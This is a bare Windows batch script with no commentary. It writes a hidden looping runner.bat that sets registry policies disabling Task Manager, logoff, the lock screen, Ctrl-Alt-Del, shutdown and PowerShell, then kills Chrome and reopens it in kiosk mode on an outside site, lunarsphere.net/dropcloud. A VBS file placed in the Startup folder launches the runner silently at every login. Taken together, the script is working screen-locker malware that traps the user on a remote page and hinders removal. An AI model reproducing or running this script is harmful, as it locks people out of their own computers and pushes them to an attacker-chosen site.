@echo off


cd %USERPROFILE%

echo :d > runner.bat
echo reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogoff /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoLogoff /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableChangePassword /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows /v Powershell /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Powershell /v EnableScripts /t REG_DWORD /d 0 /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Powershell /v ExecutionPolicy /t REG_SZ /d Restricted /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PolicyManager\default\Start /v HideShutDown /t REG_DWORD /d 1 /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DisableCAD /t REG_DWORD /d 1 /f >> runner.bat

echo reg add HKEY_LOCAL_MACHINE\Software\Microsoft\PowerShell\1\ShellIds\ScriptedDiagnostics /v "ExecutionPolicy" /t REG_SZ /d "Restricted" /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\Software\WOW6432Node\Microsoft\PowerShell\1\ShellIds\ScriptedDiagnostics /v "ExecutionPolicy" /t REG_SZ /d "Restricted" /f >> runner.bat
echo reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\Environment /v "__PSLockDownPolicy" /t REG_SZ /d "4" /f >> runner.bat

echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v "DisallowRun" /t REG_DWORD /d "1" /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v "1" /t REG_SZ /d "powershell.exe" /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v "2" /t REG_SZ /d "powershell_ise.exe" /f >> runner.bat
echo reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v "3" /t REG_SZ /d "powershellcustomhost.exe" /f >> runner.bat
echo taskkill /f /im chrome.exe >> runner.bat
echo "C:\Program Files\Google\Chrome\Application\chrome.exe" --kiosk "https://lunarsphere.net/dropcloud/" >> runner.bat
echo goto d >> runner.bat
attrib +h +s +r runner.bat

cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Set WshShell = CreateObject("WScript.Shell") > runner.vbs
echo cmds=WshShell.RUN("%USERPROFILE%\runner.bat", 0, True) >> runner.vbs
echo Set WshShell = Nothing >> runner.vbs

start runner.vbs